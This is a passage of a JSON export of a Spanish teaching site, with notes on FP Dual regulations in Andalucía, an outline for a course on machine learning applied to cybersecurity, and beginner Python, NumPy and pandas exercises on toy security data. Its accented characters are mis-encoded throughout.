Andaluc√≠a","links":["FP-Dual/240626_Instrucciones_DGFP_Andalucia.pdf","FP-Dual/241112_Guia_Organizacion_FFEOE.pdf","FP-Dual/241112_PRESENTACION_Guia_v014.pdf","FP-Dual/Modelo-solicitud-falta-puesto-formativos(F).pdf","FP-Dual/Preguntas_Implantaci√≥n-nueva-FP_2024_25.pdf"],"tags":["FP","Dual","Normativa","Andaluc√≠a"],"content":"\n\n                  \n                  Warning\n                  \n                \n\nEsto es un trabajo en curso. A√∫n en una fase alfa.\n\n\nRecopilaci√≥n de distintas normativas:\n\n240626_Instrucciones_DGFP_Andalucia.pdf\n241112_Guia_Organizacion_FFEOE.pdf\n241112_PRESENTACION_Guia_v014.pdf\nModelo solicitud falta puesto formativos(F).pdf\nPreguntas_Implantaci√≥n nueva FP_2024_25.pdf\n"},"Python--and--Machine-learning/Aprendizaje-autom√°tico-aplicado-a-la-ciberseguridad":{"title":"Aprendizaje autom√°tico aplicado a la ciberseguridad","links":[],"tags":[],"content":"Para este apartado me baso en el github github.com/cylance/IntroductionToMachineLearningForSecurityPros, el cual contiene un libro (libre) muy bueno para aprender ‚ÄúIntroduction to Artificial Intelligence for Security Professionals‚Äù. En este caso lo he adaptado para profesionales con conocimientos limitados de programaci√≥n.\n\nConceptos a Impartir (De B√°sico a Avanzado)\nEl objetivo es llevar al alumnado desde cero (o casi cero) en programaci√≥n hasta comprender y poder ejecutar (y eventualmente modificar) los ejemplos del libro.\nM√≥dulo 1: Fundamentos de Programaci√≥n con Python (Esencial)\n\nObjetivo: Dotar al alumnado de las herramientas b√°sicas de programaci√≥n necesarias para entender y escribir scripts simples.\nConceptos:\n\nIntroducci√≥n a Python: ¬øQu√© es? ¬øPor qu√© Python para IA/Seguridad?\nEntorno de desarrollo: Instalaci√≥n de Python, uso de un IDE (como VS Code con extensi√≥n Python) o Entornos Interactivos (Jupyter Notebooks / Google Colab ). Gesti√≥n b√°sica de paquetes con pip. Entornos virtuales (venv).\nSintaxis b√°sica: Variables, tipos de datos (n√∫meros, strings, booleanos, listas, tuplas, diccionarios, sets).\nOperadores: Aritm√©ticos, de comparaci√≥n, l√≥gicos.\nEstructuras de control: Condicionales (if, elif, else), bucles (for, while).\nFunciones: Definici√≥n, argumentos, retorno de valores. √Åmbito (scope) de variables.\nManejo de errores b√°sicos: Bloques try...except.\nEntrada/Salida b√°sica: Leer y escribir en archivos de texto (.txt, .csv).\n\n\nEjercicios: Para practicar estos conceptos, se debe emplear el archivo ejercicios_modulo1.ipynb.\n\nEnlace: ejercicios1.ipynb\n\n\n\nM√≥dulo 2: Manipulaci√≥n de Datos con Python\n\nObjetivo: Aprender a cargar, explorar, limpiar y preparar datos, una tarea fundamental en cualquier proyecto de ML.\nConceptos:\n\nIntroducci√≥n a NumPy: Arrays multidimensionales, operaciones vectorizadas eficientes, indexaci√≥n y slicing.\nIntroducci√≥n a Pandas:\n\nSeries y DataFrames: Las estructuras de datos clave.\nLectura y escritura de datos (CSV, JSON, etc.).\nSelecci√≥n e indexaci√≥n de datos (loc, iloc).\nLimpieza de datos b√°sicos: Manejo de valores nulos (NaN), eliminaci√≥n de duplicados.\nAgregaci√≥n y agrupaci√≥n de datos (groupby).\nVisualizaci√≥n b√°sica de datos con Pandas (integrado con Matplotlib).\n\n\nIntroducci√≥n a Matplotlib/Seaborn: Creaci√≥n de gr√°ficos b√°sicos (histogramas, scatter plots, box plots) para explorar los datos.\n\n\nEjercicios: Para practicar estos conceptos, se debe emplear el archivo ejercicios_modulo2.ipynb.\n\nEnlace: ejercicios2.ipynb\nPara practicar m√°s con Numpy: Extra_ejercicio_1_Numpy.ipynb\nPara practicar m√°s con Pandas: Extra_ejercicio_2_pandas.ipynb\nPara practicar m√°s con visualizaci√≥n: Extra_ejercicio_3_visualizacion.ipynb\nPara practicar m√°s con Sklearn - KNN: Extra_ejercicio_4_sklearn_knn.ipynb\nPara practicar m√°s con SKlearn - scaling: Extra_ejercicio_5_sklearn_scanling.ipynb\nPara practicar m√°s con keras mnist: Extra_ejercicio_6_Keras_MNIST.ipynb\nPara practicar m√°s con pytorch mnist: Extra_ejercicio_7_PyTorch_MNIST.ipynb\n\n\n\nM√≥dulo 3: Fundamentos de Inteligencia Artificial y Machine Learning (Conceptual)\n\nObjetivo: Entender los conceptos te√≥ricos clave detr√°s del ML antes de implementar algoritmos.\nConceptos:\n\n¬øQu√© es la Inteligencia Artificial? ¬øQu√© es el Machine Learning? Diferencias.\nTipos de Aprendizaje:\n\nSupervisado: Clasificaci√≥n y Regresi√≥n (conceptos, ejemplos en seguridad: detecci√≥n de malware vs. predicci√≥n de ataques).\nNo Supervisado: Clustering y Reducci√≥n de Dimensionalidad (conceptos, ejemplos en seguridad: detecci√≥n de anomal√≠as, agrupaci√≥n de tr√°fico de red).\n(Opcional/Breve) Aprendizaje por Refuerzo.\n\n\nEl Proceso de ML: Recolecci√≥n de datos ‚Üí Preprocesamiento/Ingenier√≠a de caracter√≠sticas ‚Üí Selecci√≥n del modelo ‚Üí Entrenamiento ‚Üí Evaluaci√≥n ‚Üí Despliegue.\nConceptos Clave: Caracter√≠sticas (Features), Etiquetas (Labels), Conjunto de Entrenamiento (Training Set), Conjunto de Prueba (Test Set), Conjunto de Validaci√≥n (Validation Set).\nProblemas Comunes: Sobreajuste (Overfitting) y Subajuste (Underfitting). Sesgo (Bias) y Varianza (Variance).\nM√©tricas de Evaluaci√≥n B√°sicas:\n\nPara Clasificaci√≥n: Accuracy, Precisi√≥n, Recall, F1-Score, Matriz de Confusi√≥n. Curva ROC y AUC (explicaci√≥n conceptual).\nPara Regresi√≥n: MSE, MAE (mencionar brevemente).\nPara Clustering: Silhouette Score (mencionar brevemente).\n\n\n\n\nEjercicios: Para practicar estos conceptos, se debe emplear el archivo ejercicios_modulo3.ipynb.\n\nEnlace: ejercicios3.ipynb\n\n\n\nM√≥dulo 4: Algoritmos de Machine Learning y Aplicaciones en Ciberseguridad (Pr√°ctico)\n\nObjetivo: Implementar algoritmos b√°sicos de ML usando scikit-learn y conectarlos con problemas de seguridad, preparando el terreno para los ejemplos del libro.\nConceptos:\n\nIntroducci√≥n a Scikit-learn: La librer√≠a est√°ndar de ML en Python. API consistente (fit, predict, transform).\nPreprocesamiento de Datos con Scikit-learn: Escalado de caracter√≠sticas (StandardScaler, MinMaxScaler), Codificaci√≥n de variables categ√≥ricas (OneHotEncoder, LabelEncoder).\nAlgoritmos de Clasificaci√≥n (con ejemplos simples de seguridad):\n\nRegresi√≥n Log√≠stica: Detecci√≥n simple de spam o phishing.\nK-Nearest Neighbors (KNN): Clasificaci√≥n simple basada en similitud.\n√Årboles de Decisi√≥n y Random Forests: Modelos m√°s potentes, entender su interpretabilidad (√°rbol) y robustez (bosque). Ejemplo: clasificaci√≥n b√°sica de malware basada en caracter√≠sticas simples.\n\n\nAlgoritmos de Clustering (con ejemplos simples de seguridad):\n\nK-Means: Agrupaci√≥n de logs de red para detectar patrones o anomal√≠as.\n\n\nIngenier√≠a de Caracter√≠sticas (Feature Engineering) Espec√≠fica de Seguridad (Introducci√≥n):\n\n¬øQu√© es? ¬øPor qu√© es crucial en seguridad?\nEjemplos conceptuales (sin entrar a√∫n en el c√≥digo complejo del libro): extraer longitud de URL, n√∫mero de caracteres especiales (phishing); extraer informaci√≥n de cabeceras de ejecutables PE (malware); contar tipos de peticiones en logs web (ataques).\n\n\n\n\nEjercicios: Para practicar estos conceptos, se debe emplear el archivo ejercicios_modulo4.ipynb.\n\nEnlace: ejercicios4.ipynb\n\n\n\nM√≥dulo 5: Implementaci√≥n con Ejemplos del Libro/Repositorio Cylance\n\nObjetivo: Analizar, ejecutar y entender el c√≥digo del repositorio Cylance, aplicando todo lo aprendido.\nConceptos:\n\nAn√°lisis Guiado del C√≥digo: Seleccionar 1-2 ejemplos clave del repositorio (empezar por los m√°s sencillos, si los hay).\nDesglose del C√≥digo:\n\nCarga y preprocesamiento de datos espec√≠ficos del ejemplo (e.g., datos de ficheros PE, logs de red). Explicar el porqu√© de cada paso de preprocesamiento.\nIngenier√≠a de caracter√≠sticas aplicada: Ver c√≥mo se extraen las features relevantes para ese problema de seguridad espec√≠fico.\nEntrenamiento del modelo: Ejecutar el entrenamiento, entender los par√°metros utilizados.\nEvaluaci√≥n del modelo: Interpretar las m√©tricas de rendimiento en el contexto del problema de seguridad. ¬øQu√© significa una alta precisi√≥n o un alto recall en detecci√≥n de malware?\nVisualizaci√≥n de resultados (si el ejemplo la incluye).\n\n\nAdaptaci√≥n y Experimentaci√≥n: Animar a los alumnos a hacer peque√±as modificaciones (cambiar par√°metros, probar otro modelo simple) para ver c√≥mo afecta al resultado.\n\n\nEjercicios: Para practicar estos conceptos, se debe emplear el archivo ejercicios_modulo5.ipynb.\n\nEnlace: ejercicios5.ipynb\n\n\n\nM√≥dulo 6: Consideraciones √âticas y Pr√≥ximos Pasos (Cierre)\n\nObjetivo: Reflexionar sobre el uso responsable de la IA y las limitaciones.\nConceptos:\n\nSesgos en los datos y algoritmos de IA en seguridad.\nImportancia de la interpretabilidad (Explainable AI - XAI): ¬øPor qu√© el modelo tom√≥ esa decisi√≥n?\nAdversarial Machine Learning: Ataques contra modelos de IA.\nLimitaciones actuales de la IA en ciberseguridad.\nRecursos para seguir aprendiendo.\n\n\nEjercicios: Para practicar estos conceptos, se debe emplear el archivo ejercicios_modulo6.ipynb.\n\nEnlace: ejercicios6.ipynb\n\n\n\n\n\nHerramientas Recomendadas:\n\nPython 3.x\nJupyter Notebook / JupyterLab / Google Colaboratory\nBibliotecas: NumPy, Pandas, Matplotlib, Seaborn, Scikit-learn\nGit y GitHub (para compartir c√≥digo y usar el repositorio de Cylance)\n\n\n"},"Python--and--Machine-learning/Python---webs-para-aprender":{"title":"Python - webs para aprender","links":[],"tags":[],"content":"\nprogramming-23.mooc.fi/\nwww.w3schools.com/python/\n"},"Python--and--Machine-learning/Python-ejercicios-1":{"title":"Python ejercicios 1","links":[],"tags":[],"content":"1. Variables y Tipos de Datos\nEjercicio 1.1 (Variables y Strings):\n\nCrea una variable llamada nombre_usuario y as√≠gnale tu nombre como un string.\nCrea otra variable mensaje_bienvenida que contenga el string ‚ÄúBienvenido al sistema, ‚Äú.\nImprime por pantalla la concatenaci√≥n del mensaje de bienvenida y el nombre de usuario.\nConcepto: Variables, Strings, Concatenaci√≥n, print().\n\nEjercicio 1.2 (N√∫meros y Booleanos):\n\nCrea una variable intentos_login y as√≠gnale el valor entero 3.\nCrea una variable max_intentos y as√≠gnale el valor 5.\nCrea una variable booleana sesion_activa y as√≠gnale False.\nImprime el tipo de cada una de estas variables usando la funci√≥n type().\nConcepto: Variables, Integers, Booleans, type().\n\nEjercicio 1.3 (Listas):\n\nCrea una lista llamada ips_permitidas que contenga las siguientes direcciones IP (como strings): ‚Äú192.168.1.1‚Äù, ‚Äú10.0.0.5‚Äù, ‚Äú8.8.8.8‚Äù.\nImprime la lista completa.\nImprime el segundo elemento de la lista (recordar que el √≠ndice empieza en 0).\nA√±ade la IP ‚Äú192.168.1.100‚Äù al final de la lista.\nImprime la lista modificada.\nConcepto: Listas (creaci√≥n, acceso por √≠ndice, a√±adir elementos con append()).\n\nEjercicio 1.4 (Diccionarios):\n\nCrea un diccionario llamado permisos_usuario donde las claves sean nombres de usuario (strings) y los valores sean sus roles (strings). Ejemplo: {&quot;admin&quot;: &quot;superuser&quot;, &quot;invitado&quot;: &quot;lectura&quot;, &quot;auditor&quot;: &quot;lectura_logs&quot;}.\nImprime el diccionario completo.\nImprime el rol del usuario ‚Äúadmin‚Äù.\nA√±ade un nuevo usuario ‚Äúdesarrollador‚Äù con el rol ‚Äúescritura‚Äù.\nImprime el diccionario actualizado.\nConcepto: Diccionarios (creaci√≥n, acceso por clave, a√±adir elementos).\n\n2. Operadores\nEjercicio 2.1 (Aritm√©ticos y Comparaci√≥n):\n\nUsando las variables intentos_login y max_intentos del ejercicio 1.2, calcula cu√°ntos intentos quedan (intentos_restantes = max_intentos - intentos_login). Imprime el resultado.\nVerifica si intentos_login es menor que max_intentos. Imprime el resultado (deber√≠a ser True o False).\nVerifica si el nombre_usuario (del ejercicio 1.1, aseg√∫rate de que est√© definido) es exactamente igual a ‚Äúadmin‚Äù. Imprime el resultado.\nConcepto: Operadores aritm√©ticos (-), Operadores de comparaci√≥n (&lt;, ==).\n\nEjercicio 2.2 (L√≥gicos):\n\nCrea dos variables booleanas: usuario_valido = True y password_correcto = False.\nVerifica si el usuario es v√°lido Y la contrase√±a es correcta. Imprime el resultado.\nVerifica si el usuario es v√°lido O la contrase√±a es correcta. Imprime el resultado.\nVerifica si el usuario NO es v√°lido. Imprime el resultado.\nConcepto: Operadores l√≥gicos (and, or, not).\n\n3. Estructuras de Control: Condicionales (if, elif, else)\nEjercicio 3.1 (Comprobaci√≥n Simple):\n\nPide al usuario que introduzca una contrase√±a usando input(&quot;Introduce tu contrase√±a: &quot;). Guarda la entrada en una variable password_introducida.\nComprueba si la longitud (n√∫mero de caracteres) de password_introducida es menor que 8.\nSi es menor que 8, imprime ‚ÄúContrase√±a demasiado corta. Debe tener al menos 8 caracteres.‚Äù\nSi no (es decir, si es 8 o m√°s), imprime ‚ÄúLongitud de contrase√±a aceptable.‚Äù\nConcepto: input(), len(), if...else.\n\nEjercicio 3.2 (M√∫ltiples Condiciones):\n\nUsando la password_introducida del ejercicio anterior (puedes pedirla de nuevo o reutilizar la variable si est√°s ejecutando secuencialmente):\n\nSi la longitud es menor que 8, imprime ‚ÄúContrase√±a D√âBIL‚Äù.\nSi la longitud est√° entre 8 y 12 (inclusive), imprime ‚ÄúContrase√±a MEDIA‚Äù.\nSi la longitud es mayor que 12, imprime ‚ÄúContrase√±a FUERTE‚Äù.\nConcepto: if...elif...else, operadores de comparaci√≥n (&lt;, &gt;=, &lt;=, &gt;).\n\n\n\nEjercicio 3.3 (Pertenencia):\n\nPide al usuario que introduzca su direcci√≥n IP usando input().\nUsando la lista ips_permitidas del ejercicio 1.3 (aseg√∫rate de que est√© definida), comprueba si la IP introducida est√° en la lista.\nSi est√° en la lista, imprime ‚ÄúAcceso permitido.‚Äù\nSi no est√° en la lista, imprime ‚ÄúAcceso denegado.‚Äù\nConcepto: in operator with lists, if...else.\n\nips_permitidas = [&quot;192.168.1.1&quot;, &quot;10.0.0.5&quot;, &quot;8.8.8.8&quot;, &quot;192.168.1.100&quot;]\n4. Estructuras de Control: Bucles (for, while)\nEjercicio 4.1 (for con Listas):\n\nItera sobre la lista ips_permitidas (aseg√∫rate de que est√© definida).\nDentro del bucle, imprime cada direcci√≥n IP precedida por ‚ÄúVerificando IP: ‚Äú.\nConcepto: Bucle for para iterar sobre listas.\n\nips_permitidas = [&quot;192.168.1.1&quot;, &quot;10.0.0.5&quot;, &quot;8.8.8.8&quot;, &quot;192.168.1.100&quot;] \nEjercicio 4.2 (for con range):\n\nUsa un bucle for y la funci√≥n range() para imprimir los n√∫meros del 1 al 5 (inclusive).\nConcepto: Bucle for, range().\n\nEjercicio 4.3 (while):\n\nSimula un contador de intentos de acceso. Inicializa una variable intentos a 0.\nUsa un bucle while que se ejecute mientras intentos sea menor que 3.\nDentro del bucle, imprime ‚ÄúIntento n√∫mero X‚Äù (sustituyendo X por el n√∫mero de intento actual, empezando desde 1).\nIncrementa la variable intentos en 1 en cada iteraci√≥n.\nAl salir del bucle, imprime ‚ÄúN√∫mero m√°ximo de intentos alcanzado.‚Äù\nConcepto: Bucle while, contadores, incremento.\n\n5. Funciones\nEjercicio 5.1 (Funci√≥n Simple):\n\nDefine una funci√≥n llamada saludar_usuario que tome un argumento nombre.\nDentro de la funci√≥n, debe imprimir ‚ÄúHola, [nombre]! Bienvenido/a.‚Äù.\nLlama a la funci√≥n pas√°ndole tu nombre.\nConcepto: Definici√≥n de funciones (def), argumentos, llamadas a funciones.\n\nEjercicio 5.2 (Funci√≥n con Retorno):\n\nDefine una funci√≥n llamada es_longitud_segura que tome un argumento password.\nLa funci√≥n debe devolver True si la longitud del password es 8 o m√°s, y False en caso contrario.\nLlama a la funci√≥n con diferentes contrase√±as (ej. ‚Äú12345‚Äù, ‚ÄúclaveSegura123‚Äù) y guarda el resultado en una variable. Imprime esa variable para ver el resultado.\n\nEjercicio 5.3 (Funci√≥n con Bucle y Lista):\n\nDefine una funci√≥n llamada verificar_ip que tome dos argumentos: ip_a_verificar (un string) y lista_ips (una lista).\nDentro de la funci√≥n, usa un bucle for para recorrer lista_ips.\nSi ip_a_verificar se encuentra en lista_ips, la funci√≥n debe devolver True inmediatamente.\nSi el bucle termina sin encontrar la IP, la funci√≥n debe devolver False (fuera del bucle).\nLlama a la funci√≥n usando la lista ips_permitidas y prueba con una IP que est√© en la lista (‚Äú10.0.0.5‚Äù) y otra que no (‚Äú1.1.1.1‚Äù). Imprime los resultados.\nConcepto: return statement, funciones que devuelven booleanos.\n\nEjercicio 5.3 (Funci√≥n con Bucle y Lista):\n\nDefine una funci√≥n llamada verificar_ip que tome dos argumentos: ip_a_verificar (un string) y lista_ips (una lista).\nDentro de la funci√≥n, usa un bucle for para recorrer lista_ips.\nSi ip_a_verificar se encuentra en lista_ips, la funci√≥n debe devolver True inmediatamente.\nSi el bucle termina sin encontrar la IP, la funci√≥n debe devolver False (fuera del bucle).\nLlama a la funci√≥n usando la lista ips_permitidas y prueba con una IP que est√© en la lista (‚Äú10.0.0.5‚Äù) y otra que no (‚Äú1.1.1.1‚Äù). Imprime los resultados.\nConcepto: Combinar funciones, bucles, listas y return.\n\nips_permitidas = [&quot;192.168.1.1&quot;, &quot;10.0.0.5&quot;, &quot;8.8.8.8&quot;, &quot;192.168.1.100&quot;]\n6. Manejo de Errores B√°sico (try...except)\nEjercicio 6.1 (Entrada Num√©rica):\n\nPide al usuario que introduzca el n√∫mero de d√≠as de validez de una contrase√±a (un entero) usando input().\nIntenta convertir la entrada a un entero usando int().\nUsa un bloque try...except ValueError para manejar el caso en que el usuario introduzca texto en lugar de un n√∫mero.\nSi la conversi√≥n es exitosa, imprime ‚ÄúN√∫mero de d√≠as establecido: [n√∫mero]‚Äú.\nSi ocurre un ValueError, imprime ‚ÄúError: Debes introducir un n√∫mero entero.‚Äù\n\nConcepto: try...except, ValueError, int().\n7. Entrada/Salida B√°sica (Archivos)\nEjercicio 7.1 (Escritura en Archivo):\n\nCrea una lista de strings llamada usuarios_bloqueados = [&quot;user1&quot;, &quot;test_user&quot;, &quot;guest&quot;].\nAbre un archivo llamado bloqueados.txt en modo escritura (&#039;w&#039;). Se recomienda usar with.\nUsa un bucle for para recorrer la lista usuarios_bloqueados.\nDentro del bucle, escribe cada nombre de usuario en el archivo, seguido de un salto de l√≠nea (\\n).\n\nConcepto: Abrir archivos (open()), modo escritura (&#039;w&#039;), escribir l√≠neas (write()), saltos de l√≠nea (\\n), with statement.\nEjercicio 7.2 (Lectura de Archivo):\n\nAbre el archivo bloqueados.txt que creaste en el ejercicio anterior en modo lectura (&#039;r&#039;), usando with.\nLee todas las l√≠neas del archivo usando readlines() y gu√°rdalas en una nueva lista llamada leidos_desde_archivo.\nImprime la lista leidos_desde_archivo.\nOpcional Avanzado: Imprime la lista pero eliminando el \\n de cada elemento usando un bucle for y el m√©todo .strip().\n\nConcepto: Modo lectura (&#039;r&#039;), leer l√≠neas (readlines()), with statement, m√©todo strip() (opcional)."},"Python--and--Machine-learning/Python-ejercicios-2":{"title":"Python ejercicios 2","links":[],"tags":[],"content":"Preparaci√≥n: Importar Librer√≠as\n# Importa las librer√≠as necesarias\nimport numpy as np\nimport pandas as pd\nimport matplotlib.pyplot as plt\nimport seaborn as sns\nfrom io import StringIO # Para simular archivos CSV\n \n# Configuraciones opcionales para mejor visualizaci√≥n\n%matplotlib inline \npd.set_option(&#039;display.max_rows&#039;, 100) # Mostrar m√°s filas si es necesario\nsns.set_style(&#039;whitegrid&#039;)\nParte 1: NumPy B√°sico\nEjercicio 1.1: Creaci√≥n de Arrays\n\nCrea un array de NumPy llamado tiempos_respuesta a partir de la siguiente lista de Python, que representa tiempos de respuesta de un servidor en milisegundos: [120, 135, 128, 140, 150, 133, 122].\nCrea un array de NumPy llamado vulnerabilidades con 5 puntuaciones de criticidad (n√∫meros flotantes) entre 0.0 y 10.0 (puedes inventarlos, ej: [7.5, 3.2, 8.9, 5.0, 9.8]).\nImprime ambos arrays y sus tipos (.dtype).\n\nEjercicio 1.2: Operaciones Vectorizadas\n\nConvierte los tiempos_respuesta (del ejercicio 1.1) de milisegundos a segundos dividiendo el array por 1000. Guarda el resultado en tiempos_respuesta_seg.\n‚ÄúNormaliza‚Äù las puntuaciones de vulnerabilidades dividiendo cada puntuaci√≥n por 10.0 (para que est√©n entre 0 y 1). Guarda el resultado en vulnerabilidades_norm.\nImprime los nuevos arrays.\n\ntiempos_respuesta = np.array([120, 135, 128, 140, 150, 133, 122])\nvulnerabilidades = np.array([7.5, 3.2, 8.9, 5.0, 9.8])\nEjercicio 1.3: Indexing y Slicing\n\nImprime el primer y el √∫ltimo tiempo de respuesta del array tiempos_respuesta.\nImprime los tiempos de respuesta desde el segundo hasta el cuarto elemento (inclusive).\nImprime todas las puntuaciones de vulnerabilidades que sean mayores o iguales a 7.0 (usa boolean indexing).\n\nEjercicio 1.4: Funciones Matem√°ticas B√°sicas\n\nCalcula e imprime el tiempo de respuesta medio, m√≠nimo y m√°ximo del array tiempos_respuesta usando funciones de NumPy (np.mean(), np.min(), np.max()).\n\nParte 2: Pandas Series\nEjercicio 2.1: Creaci√≥n de Series\n\nCrea una Serie de Pandas llamada intentos_fallidos a partir de la lista [5, 10, 3, 1, 8], usando como √≠ndice los nombres de usuario [&#039;admin&#039;, &#039;guest&#039;, &#039;root&#039;, &#039;user1&#039;, &#039;test&#039;].\nImprime la Serie.\n\nEjercicio 2.2: Acceso a Elementos\n\nUsando la Serie intentos_fallidos:\n\nImprime el n√∫mero de intentos fallidos del usuario ‚Äòadmin‚Äô.\nImprime el n√∫mero de intentos fallidos del segundo usuario (usando acceso posicional).\nImprime los intentos fallidos de ‚Äòguest‚Äô y ‚Äòtest‚Äô al mismo tiempo.\n\n\n\nusuarios = [&#039;admin&#039;, &#039;guest&#039;, &#039;root&#039;, &#039;user1&#039;, &#039;test&#039;]\ndatos_intentos = [5, 10, 3, 1, 8]\nintentos_fallidos = pd.Series(datos_intentos, index=usuarios)\nEjercicio 2.3: Operaciones y Filtrado\n\nUsando la Serie intentos_fallidos:\n\nImprime los usuarios que tuvieron m√°s de 4 intentos fallidos.\nIncrementa en 1 el n√∫mero de intentos fallidos para todos los usuarios e imprime la Serie resultante.\n\n\n\nParte 3: Pandas DataFrames\nEjercicio 3.1: Creaci√≥n de DataFrame desde Diccionario\n\nCrea un DataFrame de Pandas llamado df_logs a partir del siguiente diccionario, simulando logs de acceso.\nImprime el DataFrame.\n\ndata = {\n    &#039;timestamp&#039;: [&#039;2025-04-15 20:00:01&#039;, &#039;2025-04-15 20:01:15&#039;, &#039;2025-04-15 20:01:30&#039;, &#039;2025-04-15 20:02:05&#039;, &#039;2025-04-15 20:03:10&#039;],\n    &#039;usuario&#039;: [&#039;user1&#039;, &#039;admin&#039;, &#039;user1&#039;, &#039;guest&#039;, &#039;admin&#039;],\n    &#039;ip_origen&#039;: [&#039;192.168.1.10&#039;, &#039;10.0.0.5&#039;, &#039;192.168.1.10&#039;, &#039;203.0.113.1&#039;, &#039;10.0.0.5&#039;],\n    &#039;accion&#039;: [&#039;login_success&#039;, &#039;login_success&#039;, &#039;file_access&#039;, &#039;login_failed&#039;, &#039;logout&#039;]\n}\n \ndf_logs = pd.DataFrame(data)\nprint(df_logs)\nEjercicio 3.2: Simulaci√≥n de Lectura de CSV\n\nTenemos los siguientes datos simulados de un archivo CSV:\n\ntimestamp,source_ip,dest_ip,port,protocol,action\n2025-04-15 21:00:00,192.168.1.50,10.0.0.80,80,TCP,ALLOW\n2025-04-15 21:00:05,192.168.1.55,10.0.0.81,443,TCP,ALLOW\n2025-04-15 21:00:10,192.168.1.50,10.0.0.80,123,UDP,DENY\n2025-04-15 21:00:15,192.168.1.60,8.8.8.8,53,UDP,ALLOW\n2025-04-15 21:00:20,192.168.1.55,10.0.0.81,443,TCP,ALLOW\n\nUsa pd.read_csv() junto con StringIO() (importado al principio) para leer estos datos en un DataFrame llamado df_traffic.\nImprime el DataFrame.\n\ncsv_data = &quot;&quot;&quot;\ntimestamp,source_ip,dest_ip,port,protocol,action\n2025-04-15 21:00:00,192.168.1.50,10.0.0.80,80,TCP,ALLOW\n2025-04-15 21:00:05,192.168.1.55,10.0.0.81,443,TCP,ALLOW\n2025-04-15 21:00:10,192.168.1.50,10.0.0.80,123,UDP,DENY\n2025-04-15 21:00:15,192.168.1.60,8.8.8.8,53,UDP,ALLOW\n2025-04-15 21:00:20,192.168.1.55,10.0.0.81,443,TCP,ALLOW\n&quot;&quot;&quot;\n \n# Lee los datos usando pd.read_csv y StringIO\ndf_traffic = pd.read_csv(StringIO(csv_data))\nprint(df_traffic)\nEjercicio 3.3: Inspecci√≥n B√°sica\n\nUsando el DataFrame df_traffic del ejercicio anterior:\n\nMuestra las primeras 3 filas (.head()).\nMuestra las √∫ltimas 2 filas (.tail()).\nMuestra informaci√≥n general del DataFrame (.info()). ¬øQu√© tipo de datos tiene cada columna?\nMuestra un resumen estad√≠stico (si aplica, .describe()).\nMuestra los nombres de las columnas (.columns).\nMuestra las dimensiones del DataFrame (.shape).\n\n\n\nEjercicio 3.4: Selecci√≥n de Columnas\n\nUsando df_traffic:\n\nSelecciona e imprime √∫nicamente la columna ‚Äòsource_ip‚Äô.\nSelecciona e imprime las columnas ‚Äòtimestamp‚Äô, ‚Äòsource_ip‚Äô y ‚Äòaction‚Äô.\n\n\n\nEjercicio 3.5: Selecci√≥n de Filas (.loc y .iloc)\n\nUsando df_traffic:\n\nSelecciona e imprime la primera fila usando .iloc.\nSelecciona e imprime las filas con √≠ndice 1 y 3 usando .iloc.\nSelecciona e imprime la fila con √≠ndice 2 usando .loc.\nSelecciona e imprime las filas con √≠ndice 0 a 2 (inclusive) usando .loc.\n\n\n\nEjercicio 3.6: Filtrado de Filas (Boolean Indexing)\n\nUsando df_traffic:\n\nSelecciona e imprime todas las filas donde la acci√≥n (‚Äòaction‚Äô) sea ‚ÄòDENY‚Äô.\nSelecciona e imprime todas las filas donde el puerto (‚Äòport‚Äô) sea 443.\nSelecciona e imprime todas las filas donde la IP origen (‚Äòsource_ip‚Äô) sea ‚Äò192.168.1.55‚Äô.\nSelecciona e imprime todas las filas donde el protocolo sea ‚ÄòTCP‚Äô Y la acci√≥n sea ‚ÄòALLOW‚Äô.\n\n\n\nParte 4: Limpieza B√°sica de Datos\nEjercicio 4.1: Manejo de Nulos (NaN)\n\nVamos a crear un DataFrame con algunos valores faltantes:\n\ndata_vuls = {\n    &#039;cve_id&#039;: [&#039;CVE-2025-001&#039;, &#039;CVE-2025-002&#039;, &#039;CVE-2025-003&#039;, &#039;CVE-2025-004&#039;, &#039;CVE-2025-005&#039;],\n    &#039;producto&#039;: [&#039;WebServer&#039;, &#039;Database&#039;, &#039;WebServer&#039;, &#039;OS&#039;, &#039;Database&#039;],\n    &#039;puntuacion&#039;: [9.8, 7.5, np.nan, 5.0, 7.5],\n    &#039;vector&#039;: [&#039;AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&#039;, np.nan, &#039;AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N&#039;, &#039;AV:L/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:N&#039;, np.nan]\n}\ndf_vuls = pd.DataFrame(data_vuls)\n\nImprime el DataFrame df_vuls.\nCuenta cu√°ntos valores nulos hay en cada columna (.isnull().sum()).\nCrea un nuevo DataFrame df_vuls_filled donde los NaN en la columna ‚Äòpuntuacion‚Äô se reemplacen por la media de esa columna (.fillna()).\nCrea un nuevo DataFrame df_vuls_dropped donde se eliminen las filas que contengan cualquier valor NaN (.dropna()).\nImprime df_vuls_filled y df_vuls_dropped.\n\ndata_vuls = {\n    &#039;cve_id&#039;: [&#039;CVE-2025-001&#039;, &#039;CVE-2025-002&#039;, &#039;CVE-2025-003&#039;, &#039;CVE-2025-004&#039;, &#039;CVE-2025-005&#039;],\n    &#039;producto&#039;: [&#039;WebServer&#039;, &#039;Database&#039;, &#039;WebServer&#039;, &#039;OS&#039;, &#039;Database&#039;],\n    &#039;puntuacion&#039;: [9.8, 7.5, np.nan, 5.0, 7.5],\n    &#039;vector&#039;: [&#039;AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&#039;, np.nan, &#039;AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N&#039;, &#039;AV:L/AC:H/PR:L/UI:R/S:C/C:L/I:L/A:N&#039;, np.nan]\n}\ndf_vuls = pd.DataFrame(data_vuls)\n \nprint(&quot;DataFrame Original:&quot;)\nprint(df_vuls)\nprint(&quot;\\nValores Nulos por Columna:&quot;)\n# Cuenta nulos aqu√≠\n \n# Rellena nulos en &#039;puntuacion&#039; aqu√≠\n# df_vuls_filled = ...\n# print(&quot;\\nDataFrame con Nulos Rellenos:&quot;)\n# print(df_vuls_filled)\n \n# Elimina filas con nulos aqu√≠\n# df_vuls_dropped = ...\n# print(&quot;\\nDataFrame con Filas Nulas Eliminadas:&quot;)\n# print(df_vuls_dropped)\nEjercicio 4.2: Manejo de Duplicados\n\nConsidera el DataFrame df_traffic del ejercicio 3.2. Ya ten√≠a una fila duplicada (√≠ndices 1 y 4).\nEncuentra las filas duplicadas en df_traffic usando .duplicated(). ¬øQu√© resultado te da?\nCrea un nuevo DataFrame df_traffic_unique eliminando las filas duplicadas de df_traffic usando .drop_duplicates(). Conserva la primera 